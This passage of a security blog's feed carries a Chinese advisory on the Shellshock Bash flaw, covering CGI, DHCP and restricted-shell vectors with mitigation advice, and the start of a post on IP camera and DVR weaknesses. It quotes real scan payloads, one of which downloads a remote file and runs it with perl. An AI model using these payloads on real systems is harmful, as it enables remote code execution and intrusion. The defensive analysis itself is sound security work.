  &lt;li&gt;&lt;a href=&quot;http://www.rafayhackingarticles.net/2014/10/a-tale-of-another-sop-bypass-in-android.html&quot;&gt;A Tale Of Another SOP Bypass In Android Browser &amp;lt; 4.4&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

</description>
                <link>https://devco.re/blog/2014/10/13/android-webview-left-shortcuts-for-hacker/</link>
                <guid>https://devco.re/blog/2014/10/13/android-webview-left-shortcuts-for-hacker</guid>
                <pubDate>Mon, 13 Oct 2014 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Shellshock (Bash CVE-2014-6271) 威脅仍在擴大中，但無需過度恐慌</title>
                <description>&lt;p&gt;自 9/24 以來，不少資訊圈朋友日以繼夜的忙碌，這都多虧了藏在 Bash 裡 22 年的安全漏洞－&lt;a href=&quot;https://en.wikipedia.org/wiki/Shellshock_%28software_bug%29&quot;&gt;Shellshock&lt;/a&gt; (Bash CVE-2014-6271)。對於惡意攻擊者而言，這是今年來第二波淘金潮，相較於上次 &lt;a href=&quot;https://devco.re/blog/2014/04/09/openssl-heartbleed-CVE-2014-0160/&quot;&gt;Heartbleed&lt;/a&gt; 駭客們的刮刮樂遊戲需要拼運氣，這次的 Shellshock 只要一發現利用點，就能馬上擁有基本的系統操作權限，也難怪 &lt;a href=&quot;http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-6271&quot;&gt;NVD&lt;/a&gt; 給予 Shellshock 最嚴重的 10.0 分影響等級。&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;Shellshock 受影響的 Bash 版本如下：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Bash 4.3 Patch 25 （含）以前版本&lt;/li&gt;
  &lt;li&gt;Bash 4.2 Patch 48 （含）以前版本&lt;/li&gt;
  &lt;li&gt;Bash 4.1 Patch 12 （含）以前版本&lt;/li&gt;
  &lt;li&gt;Bash 4.0 Patch 39 （含）以前版本&lt;/li&gt;
  &lt;li&gt;Bash 3.2 Patch 52 （含）以前版本&lt;/li&gt;
  &lt;li&gt;Bash 3.1 Patch 18 （含）以前版本&lt;/li&gt;
  &lt;li&gt;Bash 3.0 Patch 17 （含）以前版本&lt;/li&gt;
  &lt;li&gt;Bash 2.0.5b Patch 8 （含）以前版本&lt;/li&gt;
  &lt;li&gt;Bash 1.14.7 （含）以前版本&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;這次的問題出在 bash 對環境變數的解析上。若有辦法在環境變數中塞入惡意的程式碼，並且順利將這些環境變數傳入 bash，bash 就會因解析錯誤而執行惡意指令、和讓攻擊者能直接對系統進行基本的操作。原始碼及更進階的原理請參考&lt;a href=&quot;http://blog.erratasec.com/2014/09/the-shockingly-bad-code-of-bash.html&quot;&gt;這篇&lt;/a&gt;。Shellshock 之所以嚴重，一來是因為攻擊語法相當簡單，只需要一行指令，就可以直接對系統進行操作；二來是因為 bash 使用範圍極廣，多款作業系統預設 shell 就是 bash。 常見的作業系統與其預設 shell 整理如下：&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;作業系統&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;預設 shell&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;CentOS&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;font color=&quot;red&quot;&gt;bash&lt;/font&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Fedora&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;font color=&quot;red&quot;&gt;bash&lt;/font&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;RHEL&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;font color=&quot;red&quot;&gt;bash&lt;/font&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Mac OS X&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;font color=&quot;red&quot;&gt;bash&lt;/font&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Android&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;早期是 ash, 3.0 開始是 mksh&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Debian&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;sh (Lenny, 5.0)&lt;br /&gt;dash (Squeeze, 6.0)&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;embedded device&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;大部分使用 busybox (ash)&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;FreeBSD&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;tcsh&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Ubuntu&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;dash&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;iOS&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Jailbreak 後是 bash&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;&lt;br /&gt;
我們看到近半數知名的 un*x 系統預設使用 bash，可以推想這次影響範圍有多廣，尤其是許多服務都架構在這之上，若遭受到攻擊，損失的可能是企業的機密資料或客戶資料。至於沒有預設使用 bash 的作業系統，也並不意味著完全沒有風險，例如 Ubuntu 在 DHCP 客戶端使用到 bash ，就仍然會有風險，下面文章中也會提到這樣的狀況。另外，早期新聞中常出現物聯網設備會受此漏洞影響的報導，經過我們實測，物聯網設備為求精簡，大多使用 busybox，而其 shell 為 ash，故大多數設備在這次 Shellshock 威脅中影響不大，不過儘管物聯網設備逃過了這次 Shellshock 事件，有許多設備仍然是&lt;a href=&quot;http://devco.re/blog/2014/09/24/security-of-ip-camera-and-nvr/&quot;&gt;赤裸裸&lt;/a&gt;的。&lt;/p&gt;

&lt;h3 id=&quot;常見的-shellshock-利用方式&quot;&gt;常見的 Shellshock 利用方式&lt;/h3&gt;

&lt;p&gt;Shellshock 漏洞被公布後，惡意攻擊者無不想要透過這個漏洞對伺服器進行遠端攻擊，一些遠端攻擊概念也陸續被證實。最早的&lt;a href=&quot;http://blog.erratasec.com/2014/09/bash-shellshock-scan-of-internet.html&quot;&gt;公開大量掃描&lt;/a&gt;是由 Errata Security 在其部落格公布技術細節，他們在 HTTP 請求表頭中的 Cookie、Host、Referer 中放置惡意語法 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;() { :; }; ping -c 3 209.126.230.74&lt;/code&gt;，並且利用 masscan 對全世界 HTTP 伺服器 (port 80) 進行掃描。因為一般伺服器會將 HTTP 表頭中之內容放入環境變數中，若伺服器首頁入口程式本身是 bash shell script 或者其子程序有呼叫到 bash，就會受到惡意語法的影響，執行 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ping -c 3 209.126.230.74&lt;/code&gt; 指令。&lt;/p&gt;

&lt;h4 id=&quot;攻擊使用-cgi-的網頁伺服器&quot;&gt;攻擊使用 CGI 的網頁伺服器&lt;/h4&gt;

&lt;p&gt;利用同樣的道理，惡意攻擊者開始在 HTTP 表頭中置入惡意的語法，大量去掃描網路上的 CGI 網頁，因為這種網頁常呼叫系統指令，所以成功機率都頗高，攻擊成功的結果如下圖，從這張圖也可了解這個弱點可以簡單地透過一個參數就能直接讓系統執行任意指令。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140930/shellshock_cgi2.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140930/shellshock_cgi2.png&quot; alt=&quot;攻擊使用 CGI 的網頁伺服器&quot; title=&quot;攻擊使用 CGI 的網頁伺服器&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;詳細的實作流程請參考下面影片：&lt;/p&gt;

&lt;center&gt;&lt;div class=&quot;videowrapper&quot;&gt;&lt;iframe width=&quot;560&quot; height=&quot;420&quot; src=&quot;https://www.youtube.com/embed/RUsHcZi2hIU&quot; frameborder=&quot;0&quot;&gt; &lt;/iframe&gt;&lt;/div&gt;&lt;/center&gt;

&lt;p&gt;我們團隊也在 CGI 環境下執行幾種程式語言進行測試，發現用到以下 function 時會讀取到環境變數（date 只是範例，可代換為其他系統指令），因此若伺服器在 CGI 環境下使用這些 function，會為伺服器本身帶來嚴重風險。&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Language&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Vulnerable Function&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Perl&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;exec(“date &amp;gt; /dev/null”);&lt;br /&gt;open(SHELLSHOCK, “| date &amp;gt; /dev/null”);&lt;br /&gt;system(“date &amp;gt; /dev/null;”);&lt;br /&gt;print `date &amp;gt; /dev/null`&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;PHP&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;exec(‘date’);&lt;br /&gt;system(‘date’);&lt;br /&gt;mb_send_mail();&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Python&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;os.system(‘date’)&lt;br /&gt;subprocess.call(‘date’, shell=True)&lt;br /&gt;subprocess.Popen(‘date’, shell=True)&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Ruby&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;`date`&lt;br /&gt;exec ‘date’&lt;br /&gt;system ‘date’&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;建置惡意-dhcp-伺服器感染連線使用者&quot;&gt;建置惡意 DHCP 伺服器感染連線使用者&lt;/h4&gt;

&lt;p&gt;同時，有另一批人發現某些作業系統在進行 DHCP 連線時，會將 DHCP 伺服器傳入的一些資訊塞入到環境變數中。於是，若建置一個惡意 DHCP 伺服器，對其連線的使用者就有很高的機會遭受攻擊。我們實際做了實驗攻擊一般使用者，在使用者建立連線的當下放置後門，實驗過程如下影片：&lt;/p&gt;

&lt;center&gt;&lt;div class=&quot;videowrapper&quot;&gt;&lt;iframe width=&quot;560&quot; height=&quot;420&quot; src=&quot;https://www.youtube.com/embed/rSj1v8pFVKg&quot; frameborder=&quot;0&quot;&gt; &lt;/iframe&gt;&lt;/div&gt;&lt;/center&gt;

&lt;p&gt;&lt;br /&gt;
我們也分別測試了在不同作業系統下是否會受到惡意 DHCP 伺服器影響，基本上，常見的 un*x 系統開機後自動連線基本上都會中招。&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;OS&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Version&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Vulnerable&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;CentOS&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;7.0&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;font color=&quot;red&quot;&gt;YES&lt;/font&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Debian&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;7.6&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;font color=&quot;red&quot;&gt;YES&lt;/font&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Fedora&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;20&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;font color=&quot;red&quot;&gt;YES&lt;/font&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Ubuntu&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;10.04.1 LTS&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;font color=&quot;red&quot;&gt;YES&lt;/font&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Ubuntu&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;14.04.1 LTS&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;font color=&quot;red&quot;&gt;YES&lt;/font&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Android&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;4.4.4&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;NO&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Apple iOS&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;7.0.4&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;NO&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;FreeBSD&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;10.0&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;NO&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Gentoo&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;20140925&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;NO (已修復)&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Linux Mint&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;17 “Qiana” Cinnamon&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;NO &lt;sup id=&quot;fnref:note2&quot; role=&quot;doc-noteref&quot;&gt;&lt;a href=&quot;#fn:note2&quot; class=&quot;footnote&quot; rel=&quot;footnote&quot;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Linux Mint&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Debian 201403 Cinnamon&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;NO &lt;sup id=&quot;fnref:note2:1&quot; role=&quot;doc-noteref&quot;&gt;&lt;a href=&quot;#fn:note2&quot; class=&quot;footnote&quot; rel=&quot;footnote&quot;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Mac OS X&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;10.9.5&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;NO&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;openSUSE&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;13.2&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;NO &lt;sup id=&quot;fnref:note1&quot; role=&quot;doc-noteref&quot;&gt;&lt;a href=&quot;#fn:note1&quot; class=&quot;footnote&quot; rel=&quot;footnote&quot;&gt;2&lt;/a&gt;&lt;/sup&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Synology&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;5.0-4493 update 7&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;NO (已修復)&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;繞過-gitsubversion-伺服器的-shell-限制&quot;&gt;繞過 Git/Subversion 伺服器的 shell 限制&lt;/h4&gt;

&lt;p&gt;Shellshock 也常被利用來繞過伺服器的 shell 限制，最常見的就是 Git 和 Subversion 伺服器：
通常這些伺服器允許透過 SSH 連線，但登入後都對應著受限制的 shell。透過此漏洞，可以繞過 shell 的限制，執行指令如下圖。（註：OS 中 git user 預設 shell 要為 bash 才會受到影響）&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140930/shellshock_test_git.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140930/shellshock_test_git.png&quot; alt=&quot;繞過 Git/Subversion 伺服器的 shell 限制&quot; title=&quot;繞過 Git/Subversion 伺服器的 shell 限制&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;一般我們要實作特定使用者登入 ssh 只能做特定的事情，常常會在 sshd_config 設定 ForceCommand，或是在 authorized_keys 設定 command= 如下：&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;command=&quot;[path]/gl-auth-command sitaram&quot;,[more options] ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEA18S2t...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;這次會受到 Shellshock 影響，就是因為這些設定會在使用者透過 ssh 登入時，呼叫 bash 執行，當環境變數被引入，惡意的程式碼就會被執行了。&lt;/p&gt;

&lt;h3 id=&quot;shellshock-威脅仍在擴大&quot;&gt;Shellshock 威脅仍在擴大&lt;/h3&gt;

&lt;p&gt;目前不管是白帽駭客或是黑帽駭客都還在持續尋找可以利用 Shellshock 的地方，如同前面所述，找到可以寫入環境變數的地方，並且順利傳入 bash 執行，就可以利用該弱點來執行更進一步的攻擊。&lt;/p&gt;

&lt;p&gt;從 Shellshock 爆發至今，陸陸續續傳出了很多公司的產品受到此弱點影響，整理&lt;a href=&quot;http://www.kb.cert.org/vuls/byvendor?searchview&amp;amp;Query=FIELD+Reference=252743&amp;amp;SearchOrder=4&quot;&gt;在此&lt;/a&gt;，也有一些 POC 整理在&lt;a href=&quot;https://github.com/mubix/shellshocker-pocs/&quot;&gt;這裡&lt;/a&gt;。 其中不乏出現一些常用知名套件如：OpenVPN、Pure-FTPd，而且持續更新中。&lt;/p&gt;

&lt;p&gt;現在針對 HTTP 伺服器的攻擊還是佔多數，截至目前為止我們仍持續發現網路上有各種掃描樣本，例如：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;() { :;}; /bin/bash -c &quot;echo testing9123123&quot;; /bin/uname -a&lt;/li&gt;
  &lt;li&gt;() { :;}; /bin/bash -c &quot;wget -P /var/tmp 174.143.2XX.XX/…/x ; perl /var/tmp/x&quot;&lt;/li&gt;
  &lt;li&gt;() { :;};echo vOLniO4dcLqW2I3MnIVpSfk8bmzyxXaIF$(echo vOLniO4dcLqW2I3MnIVpSfk8bmzyxXaIF)vOLniO4dcLqW2I3MnIVpSfk8bmzyxXaIF&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;除了這些陸續針對 HTTP 伺服器的案例，我們認為，一些公司購入的網路設備是 Shellshock 潛在高危險群，那些買來就擺在旁邊維運的設備，一來容易被忽略，二來是其更新不易，三來這些設備常使用到 bash，因此仍是現在惡意攻擊者專注研究的目標，請大家特別小心。&lt;/p&gt;

&lt;h3 id=&quot;結論無需過度恐慌但別掉以輕心&quot;&gt;結論：無需過度恐慌，但別掉以輕心&lt;/h3&gt;

&lt;p&gt;「只要有 bash 的系統全部都是受駭範圍！」&lt;/p&gt;

&lt;p&gt;不少朋友看到最近 Shellshock 的新聞報導，都十分緊張。儘管各位所使用的 bash 是含有漏洞的版本，但要成功執行攻擊手法需要許多條件，被攻擊者從遠端攻擊的機率偏低，因此大家不需要太過恐慌，只要注意以下設備或伺服器：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;特定 Linux 版本，並且使用 DHCP 連線&lt;/li&gt;
  &lt;li&gt;網路、資安設備&lt;/li&gt;
  &lt;li&gt;使用 CGI 的網站伺服器&lt;/li&gt;
  &lt;li&gt;已經公布含有弱點的套件&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;那我們該怎麼自保呢？在攻擊手法不斷精進之下，只過濾 CVE-2014-6271 的攻擊字串並沒有辦法完全阻擋攻擊。建議可以先將伺服器的 bash 升級至最新版本，並持續關注後續更新訊息（目前持續有繞過檢查的新 CVE 弱點發佈），使用 CGI 之伺服器搭配 iptables、IDS、Mod Security 等機制偵測攻擊特徵並將其阻擋。若有設備在這次的影響範圍，也記得向原廠索取更新程式。&lt;/p&gt;

&lt;h3 id=&quot;題外話&quot;&gt;題外話&lt;/h3&gt;

&lt;p&gt;有人說：「Linux 在 2014 年接連出包，真是一個不安全的作業系統！反觀 Windows 在這幾次都毫無影響，企業應該要全面改用 Microsoft Solution！」，但這真的是正確的想法嗎？其實一個 OpenSource 的系統、軟體，可以藉由社群的力量檢視原始碼的問題，集合眾人的力量讓系統變得更加安全。因此有被揭露出漏洞，對於一個系統來說是好事。而非 OpenSource 的系統，就只能仰賴原廠自己的資安團隊進行研究，或者是外部資安人員的發掘了。選擇作業系統的原則，最好依照系統的功能需求、產品定位、安全漏洞的修補速度等層面，才能夠選用真正符合自己需要的系統。&lt;/p&gt;

&lt;h3 id=&quot;註解&quot;&gt;註解&lt;/h3&gt;

&lt;div class=&quot;footnotes&quot; role=&quot;doc-endnotes&quot;&gt;
  &lt;ol&gt;
    &lt;li id=&quot;fn:note2&quot; role=&quot;doc-endnote&quot;&gt;
      &lt;p&gt;若手動執行 dhclient，則會遭到漏洞影響。 &lt;a href=&quot;#fnref:note2&quot; class=&quot;reversefootnote&quot; role=&quot;doc-backlink&quot;&gt;&amp;#8617;&lt;/a&gt; &lt;a href=&quot;#fnref:note2:1&quot; class=&quot;reversefootnote&quot; role=&quot;doc-backlink&quot;&gt;&amp;#8617;&lt;sup&gt;2&lt;/sup&gt;&lt;/a&gt;&lt;/p&gt;
    &lt;/li&gt;
    &lt;li id=&quot;fn:note1&quot; role=&quot;doc-endnote&quot;&gt;
      &lt;p&gt;系統環境變數會受到影響，但無法被攻擊者利用。 &lt;a href=&quot;#fnref:note1&quot; class=&quot;reversefootnote&quot; role=&quot;doc-backlink&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
    &lt;/li&gt;
  &lt;/ol&gt;
&lt;/div&gt;
</description>
                <link>https://devco.re/blog/2014/09/30/shellshock-CVE-2014-6271/</link>
                <guid>https://devco.re/blog/2014/09/30/shellshock-CVE-2014-6271</guid>
                <pubDate>Tue, 30 Sep 2014 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>網路攝影機、DVR、NVR 的資安議題 - 你知道我在看你嗎？</title>
                <description>&lt;p&gt;網路攝影機的普及率在近幾年來持續攀升，除了老人與幼兒居家照護、企業室內監控等需求迅速增加之外，結合手機應用程式讓人可隨時隨地觀看影像的方便性也成為普及的原因。當大家還以為黑帽駭客的目標仍然是網站、個人電腦時，已經有許多攻擊者悄悄地將目標轉向了各種物連網設備，例如 NAS、Wireless AP、Printer 等產品，而擁有眾多用戶的網路攝影機理所當然地也是目標之一。身為安控產品，卻造成一項資安的隱憂，是不是有點諷刺呢？&lt;/p&gt;

&lt;p&gt;恰好最近幾天忽然看到有新聞報導&lt;a href=&quot;http://news.ltn.com.tw/news/world/breakingnews/1112329&quot;&gt;「家用監視器遭駭客入侵 隱私全被看光光」&lt;/a&gt;這樣子的案例，而在去年也有類似的報導&lt;a href=&quot;http://news.networkmagazine.com.tw/classification/security/2013/06/18/51531/&quot;&gt;「數十萬支監控攝影機潛藏被駭漏洞 電影情景恐真實上演」&lt;/a&gt;，讓我們不禁想對這個事件做個深入的調查。就讓我們來看看網路攝影機以及相關產品究竟有哪些風險吧！&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;cve&quot;&gt;CVE&lt;/h3&gt;

&lt;p&gt;我們先來看看幾個大廠在 2013 年到 2014 年之間有哪些已經被公開揭露的 CVE 弱點：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;AVTECH: 3, CVE-2013-4980, CVE-2013-4981, CVE-2013-4982&lt;/li&gt;
  &lt;li&gt;AXIS: 2, CVE-2013-3543, CVE-2011-5261&lt;/li&gt;
  &lt;li&gt;Hikvision: 3, CVE-2013-4975, CVE-2013-4976, CVE-2013-4977&lt;/li&gt;
  &lt;li&gt;SONY: 1, CVE-2013-3539&lt;/li&gt;
  &lt;li&gt;Vivotek: 6, CVE-2013-1594, CVE-2013-1595, CVE-2013-1596, CVE-2013-1597, CVE-2013-1598, CVE-2013-4985&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;讀者們若進一步去看各個 CVE 的詳細資料，會發現有許多弱點都是屬於可執行任意指令的嚴重漏洞，其影響程度非常高，已不只是關於攝影內容是否被竊取，更有可能被利用此類設備進一步攻擊其他內、外網機器。&lt;/p&gt;

&lt;h3 id=&quot;台灣現況&quot;&gt;台灣現況&lt;/h3&gt;

&lt;p&gt;雖然上面提到許多知名廠牌的嚴重漏洞，但是每個國家使用的安控設備不見得都是上述幾個牌子，而身為資安業者，隨時關注自己國家的網路現況也是很合理的事情～在我們的大量觀測下，發現有許多 IP Camera、&lt;a href=&quot;http://en.wikipedia.org/wiki/Digital_video_recorder&quot;&gt;DVR (Digital Video Recoder)&lt;/a&gt;、&lt;a href=&quot;http://en.wikipedia.org/wiki/Network_Video_Recorder&quot;&gt;NVR (Network Video Recoder)&lt;/a&gt; 都存在資安議題，我們從其中提出幾個有趣的案例跟各位分享一下：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;某國外 V 牌廠商 （數量：320+）&lt;/p&gt;

    &lt;p&gt;一般的產品通常都會有預設帳號密碼，但這間廠商的產品似乎沒有預設帳號密碼，若使用者未設定帳號密碼，攻擊者只要直接點「OK」按鈕就可以登入系統，而這樣子的 DVR 在台灣有三百多台，也就是有三百多台 DVR 在網路上裸奔…&lt;a href=&quot;/assets/img/blog/20140924/case_study_01.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140924/case_study_01.png&quot; alt=&quot;網路攝影機、DVR、NVR 案例 1&quot; title=&quot;網路攝影機、DVR、NVR 案例 1&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;某國外 H 牌廠商 （數量：1200+）&lt;/p&gt;

    &lt;p&gt;有些廠商為了方便維修或者其他理由，會在 NVR 上開啟了 Telnet 服務，雖然增加了被攻擊的機率，但是若密碼強度足夠且沒有外流，也不會隨便被打進去。而這間廠商非常有趣，除了 root 帳號之外還有一組 guest 帳號，並且 guest 的密碼非常簡單，加上當初建置系統時並未檢查機敏檔案的權限是否設定錯誤，導致攻擊者可先用 guest 帳號登入，再去 /etc/shadow 讀取 root 密碼加以破解，進一步取得設備所有權限。&lt;a href=&quot;/assets/img/blog/20140924/case_study_02.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140924/case_study_02.png&quot; alt=&quot;網路攝影機、DVR、NVR 案例 2&quot; title=&quot;網路攝影機、DVR、NVR 案例 2&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;某國外 D 牌廠商 （數量：700+）&lt;/p&gt;

